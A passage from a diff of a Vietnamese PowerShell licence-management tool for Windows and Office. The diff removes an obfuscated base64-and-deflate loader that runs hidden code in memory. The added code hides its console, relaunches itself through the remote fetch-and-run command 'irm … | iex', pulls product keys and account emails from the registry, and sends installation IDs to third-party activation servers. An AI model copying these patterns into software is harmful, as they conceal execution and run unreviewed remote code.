5bYzXNnIakvczEhmAy7eyGoE85xcHJppzn4NQjJjt4imAGe3mNFOnxDA08vHMDby7w+ugS8stfX8HTtngY33LauexlCevlAr9NNiPepI5nZicMTlAEJRJWOZWQBLvzkQ2ezmerp/NpJ/OJAFlOP22wMyePj5FdjsbIsvQyTHbiGmuRstOVWUbKcvJpgmU5aXy8LH85Zpt+uFEkoQwWpV20n3p5UZDFTdJFDmbMhGimCDxeyoV4pNaxcsJZsrjsjIdklHaTiKSbdoeIYDDN9hBBO7kmDY4pHaNHw2hTskvYFcLfCjBqtxykA6RKGqxfGA7ZjTlhnytjftp1JoZD2lmNRYEujcvlDQGN3SVDPjVeKTGr006JW43JFNjV6CfHr0qWHsEqdTyK1RTqDF1wGn76+TlJGz/dHMIzpwgBWuczxezFojpVF3C6mom6gN8l9/3rzKaYpFOILzFFF3CZcoIuYJDKyA3o0mNbI0+el5NJAjt3ZY3U2DlkNcsmNTxM7bYFoGRmx0pay3ZFwnyloDDOiLfpd+vZx0462xYpgm1e9IqO4vDi16Q2vPiwRL7+4pDcG7xH7gw+KO6Qncrw/GkNpfCjMrl7+P3hxXtlkicbd4pkt1Qkh7u10t56bYtsbZZqpUr5bfttO0O+Ez1jDoR68AzPN7foDdV1nH9fwyMe0ZjeGTyFkepOMZdMrJ6nvFSYJ4cd3+oavpmcYS04PK5jiUPj1pJSQ53um3UP2nUNkjcKdaPRPmk7Rq9ROE3MAoi2uobVWSNa8tdb+BDPyB5BuG00zLrjnKyRY/6NHqo9ab47js8uaiN/ZXScNTJ/Y/V64caNwtJSYWUluVH2hhcfWPQ6nC8aGGwEf/nxyMytgTb6OzyE/uLjWXIa3B1vKYfuiRvkT+AZv72ukFGApRrxZYCeoaIuhWrGReIlufkTiSfTxst45NziikaZQqiYFEY3lAIbua9y07HxjsJUQsdopNgNL/4ziB0McX8PKuX9IrldwgPLs5uVMkhTkhxAB5Zbg4/Y9SatNXLPMn0ATd2wT0j2XnFjBF11ePEEb+/EC+UdJkY3bqzCfzeuLy0lkxVpwKROVztYL5PazjqePL2e0WrH+z65hzBBFreWek7HwEu9F+ZnIz2CicTIs+F0mrlQHuOHvVjTUOOSAojLiMTFEP2EXi7utn9tJZcIK8aNAatXv3swAab2LXraL/PakSZ1XW7QAlHSyaqxsIqG/6pOtgcOOjrhf+U43WvixYbjNk1XGBbXyo5tXouvPCbn8xX4Eg2BLRu8e7EVlu5MpTxL9ApKPOpUnE4/+tTXh2adXfgeW7Gy6RfuixQhSqvb2jjz6SpzwKWw6Ty0O47RxAu2s/IiBEhbOAX5e8ctWM4cvSZz7rRRzwdSlX/HfcuxO2eFnt0Sd8/LrLrxpnKpws/rrvquaXSzskizBDpO/hJbZUNMleaKygZ9zmVDcO96uZiDWsXmYL4PFw2h28OLX/SY3gdrht7XRpKOFg3Nwxj1hdyYBIvjEiyNS7A8LgHF7jEIUPQVf8BrWmyjgvVdvJNjjmw7jo/njKOssu/ptD6jkVqfmk1WAw2oM5xAsncMcqqaM+R/v/cR0U0ln15igK59G1e39DthRKjiKyS4Yj44wiQogHbgKgzJndDbFCp1AXWa+JPT+KQ8VHZ1fkWnT3GmbDhrbOH1jtWyY6sAisVmr/EaJboDvdnsmEXTZr0bAwzJmuMCjOM/yJuK2EG/oct6DJteXY5Xt7QtfoNvF+xcMrz4lF119YndEpmhvsNLwmyh79Qz1dsoXl12Q1ad3iGGjL+ykekvLRKHIgmgraaFXfBS6GBmhf1ty3BIk91j+/zJ4GP4Q2/4wOvJLCO4qInJ+izA7uMzeuXcBzYV/l578E/8Mhz4+rmB94FjuZSLJ5jaYDXF++O65q5x5vTB36ZOnZTFfdPFT/5SPtbup1OvJ/o/'
-$d = [System.Convert]::FromBase64String($e)
-$ms = New-Object System.IO.MemoryStream(,@($d))
-$cs = New-Object System.IO.Compression.DeflateStream($ms, [System.IO.Compression.CompressionMode]::Decompress)
-$sr = New-Object System.IO.StreamReader($cs, [System.Text.Encoding]::UTF8)
-$c = $sr.ReadToEnd()
-$sb = [scriptblock]::Create($c)
-& $sb
+# Requires RunAsAdministrator
+param()
+
+function Get-DecodedWindowsKey {
+    try {
+        $hex = (Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name 'DigitalProductId' -ErrorAction SilentlyContinue).DigitalProductId
+        if ($null -eq $hex -or $hex.Length -lt 67) { return $null }
+        $b = $hex[52..66]
+        $c = "BCDFGHJKMPQRTVWXY2346789"
+        $isWin8 = [math]::truncate($hex[66] / 6) -band 1
+        $b[14] = ($b[14] -band 247) -bor (($isWin8 -band 2) * 4)
+        $key = ""
+        $last = 0
+        for ($i = 24; $i -ge 0; $i--) {
+            $k = 0
+            for ($j = 14; $j -ge 0; $j--) {
+                $k = ($k * 256) -bxor $b[$j]
+                $b[$j] = [math]::truncate($k / 24)
+                $k = $k % 24
+            }
+            $key = $c[$k] + $key
+            $last = $k
+        }
+        if ($isWin8 -ne 0) {
+            $first = $key.Substring(0, 1)
+            $key = $key.Substring(1).Insert($last, $first)
+        }
+        $key = $key.Insert(5, '-').Insert(11, '-').Insert(17, '-').Insert(23, '-')
+        return $key
+    } catch { return $null }
+}
+
+
+# --- 1. TỰ ĐỘNG XIN QUYỀN ADMINISTRATOR & ẨN CỬA SỔ CMD ---
+$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+if (-not $isAdmin) {
+    if ($PSCommandPath) {
+        # Chạy từ file cứng (.ps1)
+        Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`"" -Verb RunAs
+    } else {
+        # Chạy file-less từ lệnh irm | iex trên RAM
+        $webCmd = "irm lic.bachkhoapc.vn | iex"
+        Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"$webCmd`"" -Verb RunAs
+    }
+    Exit
+}
+
+# Ẩn hoàn toàn cửa sổ dòng lệnh PowerShell (màu xanh/đen) chạy nền
+if (-not ("Console.Window" -as [type])) {
+    Add-Type -Name Window -Namespace Console -MemberDefinition '
+    [DllImport("Kernel32.dll")]
+    public static extern IntPtr GetConsoleWindow();
+
+    [DllImport("user32.dll")]
+    public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
+    '
+}
+[Console.Window]::ShowWindow([Console.Window]::GetConsoleWindow(), 0) | Out-Null
+
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
+
+# --- 2. THIẾT LẬP GIAO DIỆN CHÍNH (WINFORMS) ---
+$form = New-Object System.Windows.Forms.Form
+$form.SuspendLayout() # Bắt đầu tối ưu tốc độ render UI
+$form.Text = "BKC Lic - By TranHa v3.0 Ultimate - Trình Quản Lý Bản Quyền Nâng Cao"
+$form.Size = New-Object System.Drawing.Size(900, 780)
+$form.StartPosition = 'CenterScreen'
+$form.FormBorderStyle = 'FixedDialog'
+$form.MaximizeBox = $false
+$form.BackColor = [System.Drawing.Color]::FromArgb(245, 246, 250)
+
+# Định nghĩa Font chữ hiện đại
+$fontSection = New-Object System.Drawing.Font("Segoe UI Semibold", 10.5, [System.Drawing.FontStyle]::Bold)
+$fontBtn     = New-Object System.Drawing.Font("Segoe UI", 9.5, [System.Drawing.FontStyle]::Bold)
+$fontCode    = New-Object System.Drawing.Font("Consolas", 10.5)
+$fontSmall   = New-Object System.Drawing.Font("Segoe UI", 9)
+$fontNormal  = New-Object System.Drawing.Font("Segoe UI", 10)
+
+# --- KHUNG HIỂN THỊ LOG (CỐ ĐỊNH TRÊN CÙNG) ---
+$lblLogTitle = New-Object System.Windows.Forms.Label
+$lblLogTitle.Text = "Nhật ký hoạt động (System Log):"
+$lblLogTitle.Font = $fontSection
+$lblLogTitle.Location = New-Object System.Drawing.Point(20, 12)
+$lblLogTitle.AutoSize = $true
+$form.Controls.Add($lblLogTitle)
+
+
+$btnClearLog = New-Object System.Windows.Forms.Button
+$btnClearLog.Text = "Xóa Log"
+$btnClearLog.Font = $fontSmall
+$btnClearLog.Location = New-Object System.Drawing.Point(645, 8)
+$btnClearLog.Size = New-Object System.Drawing.Size(95, 28)
+$btnClearLog.BackColor = [System.Drawing.Color]::White
+$btnClearLog.Cursor = [System.Windows.Forms.Cursors]::Hand
+$btnClearLog.Add_Click({ $txtLog.Text = "" })
+$form.Controls.Add($btnClearLog)
+
+$btnCopyLog = New-Object System.Windows.Forms.Button
+$btnCopyLog.Text = "Copy Log"
+$btnCopyLog.Font = $fontSmall
+$btnCopyLog.Location = New-Object System.Drawing.Point(750, 8)
+$btnCopyLog.Size = New-Object System.Drawing.Size(95, 28)
+$btnCopyLog.BackColor = [System.Drawing.Color]::White
+$btnCopyLog.Cursor = [System.Windows.Forms.Cursors]::Hand
+$btnCopyLog.Add_Click({
+    if ($txtLog.Text) {
+        [System.Windows.Forms.Clipboard]::SetText($txtLog.Text)
+        Write-Log "Đã sao chép toàn bộ nhật ký vào Clipboard!" "CLEAN"
+    }
+})
+$form.Controls.Add($btnCopyLog)
+
+$txtLog = New-Object System.Windows.Forms.TextBox
+$txtLog.Multiline = $true
+$txtLog.ScrollBars = 'Vertical'
+$txtLog.ReadOnly = $true
+$txtLog.Location = New-Object System.Drawing.Point(20, 45)
+$txtLog.Size = New-Object System.Drawing.Size(840, 240)
+$txtLog.Font = $fontCode
+$txtLog.BackColor = [System.Drawing.Color]::White
+$txtLog.ForeColor = [System.Drawing.Color]::FromArgb(40, 40, 40)
+$form.Controls.Add($txtLog)
+
+# --- CÁC HÀM TIỆN ÍCH ---
+function Write-Log ($text, $level="INFO") {
+    $prefix = switch ($level) {
+        "CLEAN" { "[OK]   " }
+        "WARN"  { "[! WARN] " }
+        "CRIT"  { "[X CRIT] " }
+        default { "[i INFO] " }
+    }
+    $txtLog.AppendText("$prefix $text`r`n")
+    $txtLog.SelectionStart = $txtLog.Text.Length
+    $txtLog.ScrollToCaret()
+    [System.Windows.Forms.Application]::DoEvents()
+}
+
+function Invoke-CScript ($ScriptPath, $Arguments) {
+    $processInfo = New-Object System.Diagnostics.ProcessStartInfo
+    $processInfo.FileName = "cscript.exe"
+    $processInfo.Arguments = "//nologo `"$ScriptPath`" $Arguments"
+    $processInfo.RedirectStandardOutput = $true
+    $processInfo.UseShellExecute = $false
+    $processInfo.CreateNoWindow = $true
+    
+    $process = New-Object System.Diagnostics.Process
+    $process.StartInfo = $processInfo
+    $process.Start() | Out-Null
+    
+    $output = $process.StandardOutput.ReadToEnd()
+    $process.WaitForExit()
+    
+    return $output -split "`r`n" | Where-Object { $_ -match "\S" }
+}
+
+function Get-OsppPath {
+    $paths = @(
+        "$env:ProgramFiles\Microsoft Office\Office16\ospp.vbs",
+        "${env:ProgramFiles(x86)}\Microsoft Office\Office16\ospp.vbs",
+        "$env:ProgramFiles\Microsoft Office\root\Office16\ospp.vbs",
+        "${env:ProgramFiles(x86)}\Microsoft Office\root\Office16\ospp.vbs",
+        "$env:ProgramFiles\Microsoft Office\Office15\ospp.vbs",
+        "${env:ProgramFiles(x86)}\Microsoft Office\Office15\ospp.vbs",
+        "$env:ProgramFiles\Microsoft Office\root\Office15\ospp.vbs",
+        "${env:ProgramFiles(x86)}\Microsoft Office\root\Office15\ospp.vbs",
+        "$env:ProgramFiles\Microsoft Office\Office14\ospp.vbs",
+        "${env:ProgramFiles(x86)}\Microsoft Office\Office14\ospp.vbs"
+    )
+    foreach ($p in $paths) { if (Test-Path $p) { return $p } }
+    return $null
+}
+
+function Validate-Key($key) { return ($key -match "^[A-Z0-9]{5}-[A-Z0-9]{5}-[A-Z0-9]{5}-[A-Z0-9]{5}-[A-Z0-9]{5}$") }
+
+$allButtons = @()
+function Toggle-Buttons($state) {
+    foreach ($btn in $allButtons) { if ($btn) { $btn.Enabled = $state } }
+    [System.Windows.Forms.Application]::DoEvents()
+}
+
+# --- CÁC HÀM XỬ LÝ CHÍNH ---
+
+function Invoke-LicenseScan {
+    $txtLog.Text = ""
+    Write-Log ">>> ĐANG QUÉT THÔNG TIN BẢN QUYỀN WINDOWS..." "INFO"
+    try {
+        $bios = (Get-CimInstance -Query "Select * from SoftwareLicensingService" -ErrorAction Stop).OA3xOriginalProductKey
+        if ($bios) { Write-Log "Key BIOS (OEM nhúng Mainboard): $bios" "CLEAN" }
+    } catch {}
+    $regKey = Get-DecodedWindowsKey
+    if ($regKey) { Write-Log "[OK]    Key dự phòng (Registry): $regKey" "CLEAN" }
+
+
+    $winLic = Get-CimInstance SoftwareLicensingProduct -Filter "Name LIKE 'Windows%' AND PartialProductKey IS NOT NULL"
+    if ($winLic) {
+        foreach ($l in $winLic) {
+            $status = if ($l.LicenseStatus -eq 1) { "Đã kích hoạt vĩnh viễn / Hợp lệ" } else { "Chưa kích hoạt" }
+            $type = if ($l.Description -match "VOLUME_KMSCLIENT") { "KMS Client (Dễ bị crack)" } elseif ($l.Description -match "OEM") { "OEM Bản quyền số" } else { "Retail / MAK Bản quyền chuẩn" }
+            $level = if ($type -match "KMS") { "WARN" } else { "CLEAN" }
+            Write-Log "Phiên bản : $($l.Name)" "INFO"
+            Write-Log "Phân loại : $type ($($l.Description))" $level
+            Write-Log "Trạng thái: $status (5 số cuối Key: $($l.PartialProductKey))" $level
+        }
+    } else { Write-Log "Windows chưa được cài đặt Product Key." "WARN" }
+
+    Write-Log "------------------------------------------------------------" "INFO"
+    Write-Log ">>> ĐANG QUÉT THÔNG TIN BẢN QUYỀN MICROSOFT OFFICE..." "INFO"
+    
+    # 1. Quét Office 365 / M365 (User-Based Subscription)
+    $m365Found = $false
+    $identityPath = "HKCU:\Software\Microsoft\Office\16.0\Common\Identity\Identities"
+    if (Test-Path $identityPath) {
+        $identities = Get-ChildItem -Path $identityPath -ErrorAction SilentlyContinue
+        foreach ($id in $identities) {
+            $email = (Get-ItemProperty -Path $id.PSPath -Name "EmailAddress" -ErrorAction SilentlyContinue).EmailAddress
+            if ($email -and $email -match "@") {
+                Write-Log "Phát hiện M365/Office 365 (Đăng nhập Email): $email" "CLEAN"
+                $m365Found = $true
+            }
+        }
+    }
+    if ($m365Found) {
+        Write-Log "Loại: Thuê bao Subscription đám mây (User-based Activation)" "CLEAN"
+    }
+    
+    # 2. Quét Office Volume/Retail qua OSPP
+    $ospp = Get-OsppPath
+    if (!$ospp) { 
+        if (!$m365Found) { Write-Log "Không tìm thấy công cụ OSPP. Office chưa cài đặt." "WARN" }
+        return 
+    }
+    
+    $officeOutput = Invoke-CScript $ospp "/dstatus"
+    $foundOffice = $false
+    foreach ($line in $officeOutput) {
+        if ($line -match "LICENSE NAME") { Write-Log ($line.Replace("LICENSE NAME: ", "Tên gói: ")) "INFO"; $foundOffice = $true }
+        if ($line -match "LICENSE DESCRIPTION") { Write-Log ($line.Replace("LICENSE DESCRIPTION: ", "Loại: ")) "INFO" }
+        if ($line -match "LICENSE STATUS") { 
+            $lvl = if ($line -match "LICENSED") { "CLEAN" } else { "WARN" }
+            Write-Log ($line.Replace("LICENSE STATUS: ", "Trạng thái: ")) $lvl 
+        }
+        if ($line -match "Last 5 characters") { Write-Log ($line.Replace("Last 5 characters of installed product key: ", "5 số cuối Key: ")) "INFO" }
+    }
+    if (!$foundOffice -and !$m365Found) { Write-Log "Không tìm thấy giấy phép Office OSPP nào đang hoạt động." "WARN" }
+}
+
+function Clear-WinLicenses {
+    $txtLog.Text = ""
+    Write-Log ">>> ĐANG DỌN DẸP BẢN QUYỀN WINDOWS..." "INFO"
+    Invoke-CScript "$env:SystemRoot\System32\slmgr.vbs" "/upk" | Out-Null
+    Invoke-CScript "$env:SystemRoot\System32\slmgr.vbs" "/cpky" | Out-Null
+    Invoke-CScript "$env:SystemRoot\System32\slmgr.vbs" "/ckms" | Out-Null
+    Write-Log "Đã dọn dẹp sạch sẽ cấu hình bản quyền Windows!" "CLEAN"
+}
+
+function Clear-OfficeLicenses {
+    $txtLog.Text = ""
+    Write-Log ">>> ĐANG DỌN DẸP BẢN QUYỀN / TÀN DƯ CRACK OFFICE..." "INFO"
+    $ospp = Get-OsppPath
+    if (!$ospp) { Write-Log "Không tìm thấy OSPP. Office chưa cài đặt." "WARN"; return }
+    Invoke-CScript $ospp "/remhst" | Out-Null
+    $output = Invoke-CScript $ospp "/dstatus"
+    $count = 0
+    foreach ($line in $output) {
+        if ($line -match "Last 5 characters of installed product key:\s*([A-Z0-9]{5})") {
+            $key = $matches[1].Trim()
+            Invoke-CScript $ospp "/unpkey:$key" | Out-Null
+            Write-Log "-> Đã gỡ thành công Key đuôi: $key" "CLEAN"
+            $count++
+        }
+    }
+    if ($count -eq 0) { Write-Log "Không tìm thấy Key Office nào cần gỡ." "INFO" }
+    Write-Log "Hoàn tất dọn dẹp bản quyền Office!" "CLEAN"
+}
+
+function Show-OfficeUninstaller {
+    $txtLog.Text = ""
+    Write-Log ">>> ĐANG QUÉT CÁC PHIÊN BẢN OFFICE ĐÃ CÀI..." "INFO"
+    
+    $paths = @(
+        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*",
+        "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*"
+    )
+    $officeApps = Get-ItemProperty $paths -ErrorAction SilentlyContinue | Where-Object { 
+        $_.DisplayName -match "Microsoft Office|Microsoft 365|Microsoft LTSC" -and 
+        $_.DisplayName -notmatch "Language Pack|Proofing|MUI|Click-to-Run Component"
+    }
+
+    if (!$officeApps -or $officeApps.Count -eq 0) {
+        Write-Log "Không tìm thấy phần mềm Microsoft Office nào trên máy." "WARN"
+        [System.Windows.Forms.MessageBox]::Show("Không tìm thấy phần mềm Microsoft Office nào được cài đặt trên máy này.","Thông báo", 0, [System.Windows.Forms.MessageBoxIcon]::Information)
+        return
+    }
+
+    $formUn = New-Object System.Windows.Forms.Form
+    $formUn.Text = "Gỡ Cài Đặt Office"
+    $formUn.Size = New-Object System.Drawing.Size(420, 180)
+    $formUn.StartPosition = "CenterParent"
+    $formUn.FormBorderStyle = "FixedDialog"
+    $formUn.MaximizeBox = $false
+    $formUn.MinimizeBox = $false
+
+    $lbl = New-Object System.Windows.Forms.Label
+    $lbl.Text = "Chọn phiên bản Office cần gỡ cài đặt:"
+    $lbl.Location = New-Object System.Drawing.Point(20, 20)
+    $lbl.AutoSize = $true
+    $formUn.Controls.Add($lbl)
+
+    $combo = New-Object System.Windows.Forms.ComboBox
+    $combo.Location = New-Object System.Drawing.Point(20, 45)
+    $combo.Size = New-Object System.Drawing.Size(360, 30)
+    $combo.DropDownStyle = [System.Windows.Forms.ComboBoxStyle]::DropDownList
+    
+    foreach ($app in $officeApps) {
+        [void]$combo.Items.Add($app.DisplayName)
+    }
+    $combo.SelectedIndex = 0
+    $formUn.Controls.Add($combo)
+
+    $btnUn = New-Object System.Windows.Forms.Button
+    $btnUn.Text = "Tiến Hành Gỡ Cài Đặt"
+    $btnUn.Location = New-Object System.Drawing.Point(120, 90)
+    $btnUn.Size = New-Object System.Drawing.Size(160, 35)
+    $btnUn.BackColor = [System.Drawing.Color]::FromArgb(211, 47, 47)
+    $btnUn.ForeColor = [System.Drawing.Color]::White
+    $btnUn.FlatStyle = "Flat"
+    $btnUn.Cursor = "Hand"
+    $btnUn.Add_Click({
+        $selectedName = $combo.SelectedItem
+        $selectedApp = $officeApps | Where-Object { $_.DisplayName -eq $selectedName } | Select-Object -First 1
+        
+        $uninstallCmd = $selectedApp.UninstallString
+        if ($uninstallCmd) {
+            Write-Log "Đang mở trình gỡ cài đặt cho: $selectedName" "INFO"
+            Start-Process cmd.exe -ArgumentList "/c $uninstallCmd"
+            $formUn.Close()
+        } else {
+            [System.Windows.Forms.MessageBox]::Show("Không tìm thấy lệnh gỡ cài đặt cho bản này!","Lỗi", 0, 16)
+        }
+    })
+    $formUn.Controls.Add($btnUn)
+
+    $formUn.ShowDialog() | Out-Null
+}
+
+function Install-WinKeyOnline {
+    $k = $txtKey.Text.Trim()
+    if (Validate-Key $k) {
+        Write-Log "Đang nạp Key Windows: $k..." "INFO"
+        Invoke-CScript "$env:SystemRoot\System32\slmgr.vbs" "/ipk $k" | Out-Null
+        Write-Log "Đang liên hệ máy chủ. Vui lòng chờ..." "INFO"
+        $result = Invoke-CScript "$env:SystemRoot\System32\slmgr.vbs" "/ato"
+        if ($result -match "successfully" -or $result -match "thành công") { Write-Log "KÍCH HOẠT WINDOWS ONLINE THÀNH CÔNG!" "CLEAN" }
+        else { Write-Log "Kích hoạt Windows thất bại:" "CRIT"; foreach ($r in $result) { Write-Log "  $r" "WARN" } }
+    } else { Write-Log "Key không hợp lệ! Cần 25 ký tự." "WARN" }
+}
+
+function Install-OfficeKeyOnline {
+    $k = $txtKey.Text.Trim()
+    if (Validate-Key $k) {
+        $ospp = Get-OsppPath
+        if ($ospp) {
+            Write-Log "Đang nạp Key Office: $k..." "INFO"
+            Invoke-CScript $ospp "/inpkey:$k" | Out-Null
+            Write-Log "Đang liên hệ máy chủ. Vui lòng chờ..." "INFO"
+            $result = Invoke-CScript $ospp "/act"
+            if ($result -match "successful" -or $result -match "thành công" -or ($result -join " ") -match "Product activation successful") { Write-Log "KÍCH HOẠT OFFICE ONLINE THÀNH CÔNG!" "CLEAN" }
+            else { Write-Log "Kích hoạt Office thất bại:" "CRIT"; foreach ($r in $result) { Write-Log "  $r" "WARN" } }
+        } else { Write-Log "Không tìm thấy OSPP." "WARN" }
+    } else { Write-Log "Key không hợp lệ! Cần 25 ký tự." "WARN" }
+}
+
+function Get-WinIID {
+    $txtLog.Text = ""; Write-Log "Đang lấy Installation ID Windows..." "INFO"
+    $result = Invoke-CScript "$env:SystemRoot\System32\slmgr.vbs" "/dti"
+    $iid = $result | Where-Object { $_ -match "\d{20,}" } | ForEach-Object { [regex]::match($_, "\d{20,}").Value } | Select-Object -First 1
+    if ($iid) { $txtIID.Text = $iid; [System.Windows.Forms.Clipboard]::SetText($iid); Write-Log "Lấy IID thành công và đã copy vào Clipboard: $iid" "CLEAN" }
+    else { Write-Log "Lỗi lấy IID. Vui lòng nạp Key trước." "WARN" }
+}
+
+function Install-WinCID {
+    $cleanCID = $txtCID.Text -replace '\D', ''
+    if ($cleanCID.Length -eq 48) {
+        $txtCID.Text = $cleanCID; Write-Log "Đang nạp CID Windows..." "INFO"
+        $result = Invoke-CScript "$env:SystemRoot\System32\slmgr.vbs" "/atp $cleanCID"
+        if ($result -match "successfully" -or $result -match "thành công") { Write-Log "KÍCH HOẠT WINDOWS BY PHONE THÀNH CÔNG!" "CLEAN" }
+        else { Write-Log "Nạp CID thất bại:" "CRIT"; foreach ($r in $result) { Write-Log "  $r" "WARN" } }
+    } else { Write-Log "CID không hợp lệ! Phải đủ 48 số." "WARN" }
+}
+
+function Get-OfficeIID {
+    $txtLog.Text = ""; Write-Log "Đang lấy Installation ID Office..." "INFO"
+    $ospp = Get-OsppPath
+    if (!$ospp) { Write-Log "Không tìm thấy OSPP." "WARN"; return }
+    $output = Invoke-CScript $ospp "/dti"
+    $joined = ($output -join " "); $iid = $null
+    if ($joined -match "(\d{54}|\d{48}|\d{36}|\d{20,})") { $iid = $matches[1] }
+    if ($iid) { $txtIID.Text = $iid; [System.Windows.Forms.Clipboard]::SetText($iid); Write-Log "Lấy IID thành công và đã copy vào Clipboard: $iid" "CLEAN" }
+    else { Write-Log "Lỗi lấy IID Office. Hãy nạp Key trước." "WARN"; foreach ($l in $output) { Write-Log "  $l" "INFO" } }
+}
+
+function Install-OfficeCID {
+    $ospp = Get-OsppPath
+    if (!$ospp) { Write-Log "Không tìm thấy OSPP." "WARN"; return }
+    $cleanCID = $txtCID.Text -replace '\D', ''
+    if ($cleanCID.Length -eq 48) {
+        $txtCID.Text = $cleanCID; Write-Log "Đang nạp CID Office..." "INFO"
+        $result = Invoke-CScript $ospp "/actcid:$cleanCID"
+        if ($result -match "successful" -or $result -match "thành công" -or ($result -join " ") -match "successfully") { Write-Log "KÍCH HOẠT OFFICE BY PHONE THÀNH CÔNG!" "CLEAN" }
+        else { Write-Log "Nạp CID thất bại:" "CRIT"; foreach ($r in $result) { Write-Log "  $r" "WARN" } }
+    } else { Write-Log "CID không hợp lệ! Phải đủ 48 số." "WARN" }
+}
+
+function Invoke-AutoWinPhone {
+    Get-WinIID
+    $iid = $txtIID.Text.Trim()
+    if ([string]::IsNullOrWhiteSpace($iid) -or $iid.Length -ne 63) { return }
+    
+    Write-Log "Đang kết nối Server Get CID tự động..." "INFO"
+    try {
+        $response = Invoke-WebRequest -Uri "https://khoatoantin.com/api/getcid?iid=$iid" -UseBasicParsing -TimeoutSec 15 -ErrorAction Stop
+        $cid = $response.Content.Trim() -replace '\D', ''
+        
+        if ($cid.Length -eq 48) {
+            $txtCID.Text = $cid
+            Write-Log "=> Đã lấy CID tự động thành công: $cid" "CLEAN"
+            Install-WinCID
+        } else {
+            Write-Log "Server trả về lỗi hoặc Key đã vượt quá giới hạn." "WARN"
+            Write-Log "Hãy copy IID và tự lấy CID trên Web, sau đó nạp thủ công." "INFO"
+        }
+    } catch {
+        Write-Log "Không thể kết nối đến Web API Get CID." "CRIT"
+    }
+}
+
+function Invoke-AutoOfficePhone {
+    Get-OfficeIID
+    $iid = $txtIID.Text.Trim()
+    if ([string]::IsNullOrWhiteSpace($iid) -or $iid.Length -ne 63) { return }
+    
+    Write-Log "Đang kết nối Server Get CID tự động..." "INFO"
+    try {
+        $response = Invoke-WebRequest -Uri "https://khoatoantin.com/api/getcid?iid=$iid" -UseBasicParsing -TimeoutSec 15 -ErrorAction Stop
+        $cid = $response.Content.Trim() -replace '\D', ''
+        
+        if ($cid.Length -eq 48) {
+            $txtCID.Text = $cid
+            Write-Log "=> Đã lấy CID tự động thành công: $cid" "CLEAN"
+            Install-OfficeCID
+        } else {
+            Write-Log "Server trả về lỗi hoặc Key đã vượt quá giới hạn." "WARN"
+            Write-Log "Hãy copy IID và tự lấy CID trên Web, sau đó nạp thủ công." "INFO"
+        }
+    } catch {
+        Write-Log "Không thể kết nối đến Web API Get CID." "CRIT"
+    }
+}
+
+function Invoke-AutoGetCID {
+    $iid = $txtIID.Text.Trim()
+    if (-not ($iid -match "^\d{63}$")) {
+        Write-Log "IID không hợp lệ! Vui lòng Lấy IID trước (phải đủ 63 số)." "WARN"
+        return
+    }
+    
+    $txtLog.Text = ""
+    Write-Log "Đang gửi yêu cầu lấy CID tự động lên máy chủ..." "INFO"
+    Write-Log "Vui lòng đợi vài giây (tối đa 30s)..." "INFO"
+    [System.Windows.Forms.Application]::DoEvents()
+    
+    try {
+        # API Demo: Có thể thay thế bằng endpoint thực tế
+        $apiUrl = "https://getcid.info/api/cid?iid=$iid"
+        $response = Invoke-RestMethod -Uri $apiUrl -Method Get -TimeoutSec 30 -ErrorAction Stop
+        
+        $cid = $null
+        if ($response.cid) { $cid = $response.cid }
+        elseif ($response -match "\d{48}") { $cid = $matches[0] }
+        
+        if ($cid -match "^\d{48}$") {
+            $txtCID.Text = $cid
+            Write-Log "Lấy CID tự động THÀNH CÔNG: $cid" "CLEAN"
+            Write-Log "Bây giờ bạn có thể bấm Nạp CID!" "INFO"
+        } else {
+            Write-Log "Máy chủ không trả về CID hợp lệ hoặc IID đã bị block." "WARN"
+            Write-Log "Dữ liệu trả về: $response" "INFO"
+        }
+    } catch {
+        Write-Log "Lỗi kết nối hoặc Web API tạm thời ngưng hoạt động." "CRIT"
+        Write-Log $_.Exception.Message "WARN"
+        Write-Log "Vui lòng lấy CID thủ công qua Web/Call." "INFO"
+    }
+}
+
+function Invoke-DeepScan {
+    $txtLog.Text = ""; Write-Log ">>> KHỞI ĐỘNG TRÌNH QUÉT BẢO MẬT DẤU VẾT CRACK..." "INFO"; $isCrack = $false
+    $badSvc = @("AutoKMS", "KMSELDI", "SppExtComObjHook", "SECOH-QAD", "KMS-R@1n")
+    $foundSvcs = Get-Service -Name $badSvc -ErrorAction SilentlyContinue
+    if ($foundSvcs) { foreach ($s in $foundSvcs) { Write-Log "Phát hiện Service Crack: $($s.Name)" "CRIT" }; $isCrack = $true }
+    $tasks = Get-ScheduledTask -TaskName "AutoKMS*", "KMSAuto*", "SppExtComObjHook*" -ErrorAction SilentlyContinue
+    if ($tasks) { foreach ($t in $tasks) { Write-Log "Phát hiện Task Crack: $($t.TaskName)" "CRIT" }; $isCrack = $true }
+    $reg = "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\CurrentVersion\Software Protection Platform"
+    try { if ((Get-ItemProperty $reg -Name "NoGenTicket" -ErrorAction Stop).NoGenTicket -eq 1) { Write-Log "Registry NoGenTicket = 1 (Chặn kích hoạt)." "CRIT"; $isCrack = $true } } catch {}
+    $port = Get-NetTCPConnection -LocalPort 1688 -State Listen -ErrorAction SilentlyContinue
+    if ($port) { Write-Log "Cổng mạng KMS ảo 1688 đang mở." "CRIT"; $isCrack = $true }
+    if (-not $isCrack) { Write-Log "HỆ THỐNG SẠCH: Không phát hiện Crack!" "CLEAN" }
+}
+
+function Invoke-FixHosts {
+    $txtLog.Text = ""; Write-Log ">>> ĐANG KIỂM TRA FILE HOSTS..." "INFO"
+    $hostsPath = "$env:SystemRoot\System32\drivers\etc\hosts"
+    if (Test-Path $hostsPath) {
+        $lines = Get-Content $hostsPath
+        $msDomainPatterns = @("activation\.sls\.microsoft\.com","kms\.core\.windows\.net","displaycatalog\.mp\.microsoft\.com","licensing\.mp\.microsoft\.com","go\.microsoft\.com","sls\.microsoft\.com")
+        $blockedLines = @(); $cleanLines = @()
+        foreach ($line in $lines) {
+            $isBlocked = $false
